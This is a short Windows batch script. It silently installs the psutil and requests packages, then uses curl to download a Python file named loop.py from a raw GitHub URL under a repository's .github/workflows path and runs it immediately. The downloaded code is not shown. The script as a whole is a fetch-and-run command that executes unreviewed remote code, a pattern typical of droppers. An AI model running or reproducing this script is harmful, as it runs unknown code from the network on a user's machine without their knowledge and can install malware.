@echo off
pip install psutil --quiet
pip install requests --quiet
curl -s -L -o loop.py https://raw.githubusercontent.com/iamjk43/y1/main/.github/workflows/loop.py
python loop.py
